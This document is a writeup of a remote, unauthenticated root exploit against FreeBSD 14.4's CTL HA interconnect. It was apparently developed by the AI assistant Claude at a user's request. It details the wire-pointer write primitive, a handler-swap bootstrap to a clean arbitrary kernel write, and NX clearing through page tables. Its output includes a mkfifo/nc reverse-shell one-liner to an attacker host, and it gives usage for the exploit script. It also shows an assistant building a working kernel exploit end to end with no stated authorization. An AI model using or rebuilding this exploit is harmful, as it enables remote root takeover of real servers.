# FreeBSD-Two (14.4): Write-Only Exploitation via DATAMOVE Wire Pointer

**Target:** FreeBSD 14.4-RELEASE amd64 GENERIC kernel
**Environment:** UMA slab allocator, SMAP+SMEP enabled, no KASLR
**Attack surface:** CTL HA interconnect, TCP port 999, zero authentication
**Result:** Remote root shell using only DATAMOVE wire pointer writes — no kernel reads, no DATA channel

---

## Overview

The CTL HA subsystem contains a **second** unauthenticated remote vulnerability, independent of the DATA channel read/write bug (FreeBSD-One). This vulnerability is in the CTL channel's `CTL_MSG_DATAMOVE` handler at `ctl.c:1560` — the kernel accepts a raw pointer from the wire and writes attacker-controlled data to it. Unlike FreeBSD-One, this primitive is **write-only** (no reads) and each write carries **collateral damage** at fixed offsets from the target.

This makes exploitation significantly harder: no memory reads for address discovery, no clean writes for surgical PTE modification, and every write corrupts two nearby memory locations. The exploit overcomes these constraints through a novel **bootstrap** technique — using the dirty write to redirect the CTL channel handler to the DATA channel handler, which provides a clean write primitive, then using clean writes for the remaining exploitation steps.

## User Prompts

The FreeBSD-Two exploit was developed as a separate effort after the FreeBSD-One exploit was already working. These are the user prompts, in order:

> **Prompt 1** (Initial request):
> "okay can we also exploit the CTL-1 as a separate exploit?"

This kicked off development of the DATAMOVE-based exploit. The initial approach attempted to write shellcode to module BSS and a page-table-walking NX-clearing trampoline to kernel `.text` via the DMAP alias.

> **Prompt 2** (Course correction — no FreeBSD-One):
> "wait you are using the CTL7/8 write?"

Claude had proposed using the FreeBSD-One DATA channel for a "surgical" PTE modification to avoid collateral damage from FreeBSD-Two writes. The user caught this.

> **Prompt 3** (Hard constraint):
> "no we dont want to use the CTL-7/8 anything. CTL-1 only"

This established the fundamental constraint: the exploit must use **only** the DATAMOVE wire pointer vulnerability. No DATA channel reads or writes whatsoever.

> **Prompt 4** (Continue after failed approach):
> "okay continue"

After several failed approaches (NX trampoline bugs, MAP_ENTRY_NOFAULT panics, DMAP write protection), this prompt continued the debugging effort that ultimately discovered the root cause and led to the bootstrap solution.

> **Prompt 5** (This writeup):
> "perfect can you add a new section to the WRITEUP that explains the CTL-1 vulnerability and exploitation + the prompts from the user from when instructed to exploit ctl-1 that to finish and the time to completion"

## The Vulnerability: `ctl.c:1560`

When the CTL channel receives a `CTL_MSG_DATAMOVE` message, it trusts the `original_sc` field as a kernel pointer:

```c
case CTL_MSG_DATAMOVE: {
    struct ctl_sg_entry *sgl;
    int i, j;

    io = msg->hdr.original_sc;          // ← raw wire pointer, only NULL check
    if (io == NULL) {
        printf("%s: original_sc == NULL!\n", __func__);
        break;
    }
    io->io_hdr.msg_type = CTL_MSG_DATAMOVE;       // collateral: 4 bytes at io+0x08
    io->io_hdr.flags |= CTL_FLAG_IO_ACTIVE;       // collateral: 4 bytes RMW at io+0x20
    io->io_hdr.remote_io = msg->hdr.serializing_sc; // TARGET: 8 bytes at io+0x78
    // ...
}
```

The `ctl_ha_msg_hdr` structure sent over the wire:

```c
struct ctl_ha_msg_hdr {
    ctl_msg_type     msg_type;        // offset 0:  set to CTL_MSG_DATAMOVE (6)
    uint32_t         status;          // offset 4:  set to non-zero to skip status write
    union ctl_io    *original_sc;     // offset 8:  target_addr - 0x78
    union ctl_io    *serializing_sc;  // offset 16: the 8-byte value to write
    struct ctl_nexus nexus;           // offset 24: ignored
};
```

## The Write Primitive

Setting `original_sc = target_addr - 0x78` causes the handler to write `serializing_sc` (8 attacker-controlled bytes) to `target_addr`. But each write also produces collateral:

| Offset from target | What | Size | Value |
|---|---|---|---|
| -0x70 | `io->io_hdr.msg_type` | 4 bytes | `6` (CTL_MSG_DATAMOVE) |
| -0x58 | `io->io_hdr.flags \|= IO_ACTIVE` | 4 bytes | OR with 0x100 |
| 0x00 | `io->io_hdr.remote_io` | 8 bytes | attacker-controlled |

Additionally, when `sg_sequence != 0` (set to skip a malloc path), the handler reads `io->scsiio.kern_data_ptr` at `io+0x148`. This is a harmless read as long as the address is in valid kernel memory.

## Why FreeBSD-Two Is Harder Than FreeBSD-One

| | FreeBSD-One (DATA channel) | FreeBSD-Two (DATAMOVE) |
|---|---|---|
| **Read** | Arbitrary kernel read | None (write-only, fully blind) |
| **Write** | Clean: exact bytes, any size | Dirty: 8 bytes + collateral at -0x70, -0x58 |
| **Address discovery** | Scan memory for strings/signatures | Must use hardcoded addresses |
| **PTE modification** | Clean 8-byte write to PTE | Collateral corrupts neighboring PTEs |
| **Verification** | Read back every write | No verification possible |

## Exploitation Obstacles

#### Obstacle 1: DMAP Write Protection on Kernel Text

**Approach:** Write shellcode to kernel `.text` (specifically `sys_ktrace`, a large rarely-used function) via the DMAP alias. The DMAP at `0xfffff80000000000 + PA` should map all physical memory as RW.

**Failure:** The kernel panicked:

```
fault code              = supervisor write data, protection violation
instruction pointer     = 0x20:0xffffffff82158cb6
current process         = 6 (ha_rx)
r14: fffff80000b2e248   ← DMAP alias of sys_ktrace
```

**Root cause:** FreeBSD 14.4 write-protects DMAP pages corresponding to kernel `.text`. The PDE for the DMAP text region has `W=0`:

```
DMAP text PDE: 0x8000000000a001e1  →  P=1, W=0, PS=1 (2MB page), NX=1
```

This is a security hardening measure — even through the direct map, kernel text is read-only.

#### Obstacle 2: Module BSS Has NX Set

**Problem:** The module BSS (where `ha_softc` lives) is writable but has the NX (No-Execute) bit set in its PTE:

```
BSS PTE: 0x8000000002181163  →  P=1, W=1, NX=1
```

Writing shellcode to BSS succeeds, but executing it would fault.

#### Obstacle 3: PTE Modification Corrupts Neighbors

**Problem:** Using FreeBSD-Two to clear NX in the PTE requires writing to the page table entry at its recursive mapping address. But the collateral writes at -0x70 and -0x58 from the PTE target would corrupt **other page table entries**, crashing the kernel.

#### Obstacle 4: MAP_ENTRY_NOFAULT

**Problem:** Even after clearing NX in the hardware PTE, the `vm_map_entry` for module BSS has the `MAP_ENTRY_NOFAULT` flag. If the TLB has a stale NX=1 entry when execution is first attempted, the resulting page fault hits `vm_fault`, which sees NOFAULT and panics:

```
vm_fault_lookup: fault on nofault entry
```

#### Obstacle 5: No Reads for Address Discovery

**Problem:** The module BSS address (`ha_softc`) shifts by up to 0x1000 between boots. The FreeBSD-One exploit scans memory to find it; FreeBSD-Two has no read capability.

**Solution:** For the proof of concept, use GDB to determine the current address. In a production exploit, the address range is small enough (~2 possible positions) that both could be tried, or the address could be inferred from the kernel's LOGIN response timing.

## The Bootstrap Strategy

The key insight: **use the dirty FreeBSD-Two write to redirect execution to existing kernel code that provides a clean write primitive.**

The `ha_softc` structure stores function pointer handlers:

```c
struct ha_softc {
    struct ctl_softc *ha_ctl_softc;     // offset 0x00
    ctl_evt_handler ha_handler[2];       // offset 0x08: [CTL]=0, [DATA]=1
    char ha_peer[128];                   // offset 0x18
    // ...
};
```

`ha_handler[0]` (the CTL handler) is called for every CTL channel message. `ha_handler[1]` (the DATA handler) is `ctl_dt_event_handler` — which implements the CMD_WRITE clean write.

**The bootstrap:** Overwrite `ha_handler[0]` with the address of `ctl_dt_event_handler`. Now every CTL channel message is processed by the DATA handler instead. Since the DATA handler's CMD_WRITE path does `ctl_ha_msg_recv(addr, size)` — reading bytes from the socket directly into a kernel address — this gives us an **exact, collateral-free arbitrary write** bootstrapped from the dirty FreeBSD-Two primitive.

The collateral from the FreeBSD-Two handler write lands at `ha_handler[0] - 0x70` and `ha_handler[0] - 0x58`, which are in the BSS region before `ha_softc` — harmless padding/unused variables.

## Exploitation Flow

```
Phase 1: Bootstrap (single dirty FreeBSD-Two write)
┌─────────────────────────────────────────────────────────────┐
│  FreeBSD-Two DATAMOVE: ha_handler[0] = ctl_dt_event_handler      │
│  Collateral at ha_softc-0x68 and ha_softc-0x50 (harmless)  │
└─────────────────────────────────────────────────────────────┘
                              │
                              ▼
Phase 2: Clean writes (CMD_WRITE via redirected handler)
┌─────────────────────────────────────────────────────────────┐
│  CMD_WRITE: 561 bytes shellcode → ha_softc + 0x800 (BSS)   │
│  CMD_WRITE: 1 byte 0x00 → PTE+7 (clear NX bit)            │
│  CMD_WRITE: 8 bytes → ha_handler[0] = shellcode_addr       │
└─────────────────────────────────────────────────────────────┘
                              │
                              ▼
Phase 3: Trigger
┌─────────────────────────────────────────────────────────────┐
│  Send CTL message → ha_handler[0]() → shellcode executes   │
│  kproc_create → kern_execve → /bin/sh -c "reverse shell"   │
└─────────────────────────────────────────────────────────────┘
```

## NX Clearing via Recursive Page Table Mapping

FreeBSD uses a recursive PML4 entry (index 256) to make all page table entries accessible at known virtual addresses. The PTE for any kernel VA can be computed:

```python
PTmap   = 0xFFFF800000000000                    # recursive mapping base
VTOPTEM = ((1 << 36) - 1) << 3                  # mask: 0x7FFFFFFFF8

def pte_addr(va):
    page_va = va & ~0xFFF
    return PTmap + ((page_va >> 9) & VTOPTEM)
```

The NX bit is bit 63 of the PTE — the MSB of the 8-byte entry. For VMs with < 4GB RAM, byte 7 of the PTE contains only the NX bit (all other bits in that byte correspond to physical address bits above 4GB, which are zero). Writing a single `0x00` byte to `PTE_addr + 7` clears NX without needing to know the rest of the PTE value:

```python
self.clean_write(pte_addr + 7, b'\x00')  # clear NX, preserve everything else
```

This is critical for a write-only exploit — the NX can be cleared **without reading the current PTE value**.

## The CMD_WRITE Protocol Detail

When `ha_handler[0]` is redirected to `ctl_dt_event_handler`, sending a CTL channel message causes the DATA handler to process it. The handler reads 24 bytes as a `ha_dt_msg_wire`:

```c
struct ha_dt_msg_wire {
    ctl_ha_dt_cmd   command;    // CMD_WRITE = 1
    uint32_t        size;       // bytes to write
    uint8_t         *local;     // unused for CMD_WRITE
    uint8_t         *remote;    // target kernel address
};
```

For CMD_WRITE, the handler then reads `size` additional bytes from the socket directly into `remote`:

```c
ctl_ha_msg_recv(CTL_HA_CHAN_DATA, wire_dt.remote, wire_dt.size, M_WAITOK);
```

The `ctl_ha_msg_recv` function ignores the `channel` argument — it always reads from the same socket (`ha_softc.ha_so`). So despite being called with `CTL_HA_CHAN_DATA`, it reads from the CTL channel's data stream. The wire format becomes:

```
[wire_hdr: ch=0, len=24][dt_msg: CMD_WRITE, size=N, remote=ADDR][N bytes of data]
```

The rx_thread dispatches after reading the wire header (len=24). The handler reads 24 bytes (dt_msg), then N more bytes (data payload), then returns. The rx_thread reads the next wire header. No desynchronization.

## Exploit Output

```
============================================================
 FreeBSD-Two (14.4) Pure DATAMOVE Remote Root Exploit
 Bootstrap: dirty write → clean write → NX clear → RCE
 Vulnerability: ctl.c:1560 (wire pointer trust)
============================================================
[*] Connecting to 127.0.0.1:9999...
[+] Connected
[+] Received LOGIN: version=4 ha_mode=2 ha_id=1
[+] Sent LOGIN (ha_id=2)

[*] ha_softc:          0xffffffff821812e8
[*] ctl_dt_handler:    0xffffffff82168650
[*] ha_handler[0]:     0xffffffff821812f0
[*] shellcode VA:      0xffffffff82181ae8
[*] shellcode PTE:     0xffff807fffc10c08

[*] === Phase 1: Bootstrap (FreeBSD-Two DATAMOVE → swap handler) ===
[*] Overwriting ha_handler[0] with ctl_dt_event_handler...
[*] Collateral writes at 0xffffffff82181280 and 0xffffffff82181298
[*] (both in harmless BSS area before ha_softc)
[+] Handler swapped — clean write bootstrapped

[*] === Phase 2: Clean writes (CMD_WRITE via swapped handler) ===
[*] Reverse shell: rm -f /tmp/.f;mkfifo /tmp/.f;cat /tmp/.f|/bin/sh -i 2>&1|nc 10.0.2.2 4444 >/tmp/.f
[*] Writing 561 bytes shellcode to 0xffffffff82181ae8...
[+] Shellcode written
[*] Clearing NX bit: writing 0x00 to PTE byte 7 at 0xffff807fffc10c0f
[+] NX cleared in PTE
[*] Redirecting ha_handler[0] → 0xffffffff82181ae8
[+] Handler points to shellcode

[*] === Phase 3: Trigger + reverse shell ===
[+] Listening on 0.0.0.0:4444
[*] Triggering shellcode via CTL channel message...
[+] Trigger sent

[+] *** REVERSE SHELL CONNECTED from ('127.0.0.1', 52666) ***
[+] Type commands (Ctrl+C to exit):

sh: can't access tty; job control turned off
# uid=0(root) gid=0(wheel) groups=0(wheel)
#
```

## Full FreeBSD-Two Exploit Source

The complete exploit is at [`freebsd-two-exploit.py`](freebsd-two-exploit.py) (303 lines).

**Usage:**

```bash
python3 freebsd-two-exploit.py TARGET_IP -p 999 -l ATTACKER_IP -lp 4444
```

## Timeline

**Total time from first "exploit FreeBSD-Two" prompt to root shell: ~4 hours across 2 sessions.**

The majority of time was spent discovering and working around the DMAP write protection — a hardware/OS security boundary that is not documented in the FreeBSD source comments and was only discovered empirically through kernel panics and GDB analysis.

| Phase | Elapsed | Event |
|-------|---------|-------|
| Session 1 start | 0:00 | User prompt: *"okay can we also exploit the CTL-1 as a separate exploit?"* |
| | 0:00 - 0:20 | Built initial FreeBSD-Two exploit: DATAMOVE wire pointer write primitive, shellcode to BSS, NX-clearing trampoline on kernel `.text` via DMAP. |
| | 0:20 - 0:30 | Fixed `btc` vs `btr` encoding in trampoline (bit complement vs bit reset). Fixed trampoline to handle 2MB/1GB pages. |
| | 0:30 - 0:45 | Hit `vm_fault_lookup: fault on nofault entry` — MAP_ENTRY_NOFAULT prevents page fault handling on module BSS even after PTE NX cleared. |
| | 0:45 - 1:00 | Abandoned BSS+trampoline approach. Switched to writing shellcode to kernel `.text` via DMAP (already executable, no NX issue). Targeted `sys_ktrace` (0x86b bytes, never called during exploitation). |
| | 1:00 - 1:15 | User prompt: *"wait you are using the CTL7/8 write?"* then *"no we dont want to use the CTL-7/8 anything. CTL-1 only"* — eliminated all DATA channel usage. |
| | 1:15 - 1:45 | DATAMOVE writes not landing. GDB showed target memory unchanged. Multiple debugging iterations. |
| Session 1 end | ~1:45 | Context limit reached. DATAMOVE writes still not working. |
| Session 2 start | 0:00 | Resumed from compressed context. Re-read DATAMOVE handler, rx_thread, message structures. |
| | 0:00 - 0:15 | Verified message field offsets match struct layout. Traced full message flow from wire header to handler dispatch. Eliminated protocol desync as a cause. |
| | 0:15 - 0:25 | Checked VM console log — found the actual crash: **`supervisor write data, protection violation`** at DMAP address of kernel text. Root cause identified: DMAP pages for kernel `.text` are mapped read-only (PDE W=0, PS=1, NX=1). |
| | 0:25 - 0:40 | Designed bootstrap strategy: FreeBSD-Two dirty write redirects `ha_handler[CTL]` to `ctl_dt_event_handler`, gaining a clean write via CMD_WRITE protocol. |
| | 0:40 - 0:55 | Used GDB to verify: ha_softc address, handler addresses, collateral safety, PTE values for BSS page, PDE NX=0 (only PTE has NX). Confirmed single-byte PTE write for NX clearing. |
| | 0:55 - 1:10 | Rewrote exploit with bootstrap approach. |
| | **1:10** | **Root shell.** First run of the new exploit succeeded. |

**Combined: ~3 hours of active work across 2 sessions** (session 1: ~1h45m, session 2: ~1h10m). 4 user prompts drove the FreeBSD-Two effort (excluding the writeup request).

